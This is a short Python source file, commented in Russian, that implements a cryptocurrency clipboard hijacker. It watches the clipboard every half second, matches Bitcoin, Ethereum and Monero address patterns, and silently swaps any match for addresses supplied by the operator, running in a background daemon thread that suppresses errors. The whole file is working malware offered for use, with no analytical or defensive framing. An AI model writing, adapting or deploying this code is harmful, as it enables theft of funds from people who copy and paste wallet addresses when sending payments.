import time
import threading
import re
import pyperclip

CRYPTO_PATTERNS = {
    'btc': r'[13][a-km-zA-HJ-NP-Z1-9]{25,34}',
    'eth': r'0x[a-fA-F0-9]{40}',
    'xmr': r'4[0-9AB][123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz]{93}'
}

def hijack(new_btc, new_eth, new_xmr):
    """Перехватывает крипто-адреса в буфере обмена и заменяет на наши"""
    last = ''
    while True:
        try:
            current = pyperclip.paste()
            if current != last:
                last = current
                # Проверяем на соответствие крипто-адресу
                if re.match(CRYPTO_PATTERNS['btc'], current):
                    pyperclip.copy(new_btc)
                elif re.match(CRYPTO_PATTERNS['eth'], current):
                    pyperclip.copy(new_eth)
                elif re.match(CRYPTO_PATTERNS['xmr'], current):
                    pyperclip.copy(new_xmr)
        except:
            pass
        time.sleep(0.5)

def start_hijack(btc, eth, xmr):
    t = threading.Thread(target=hijack, args=(btc, eth, xmr), daemon=True)
    t.start()
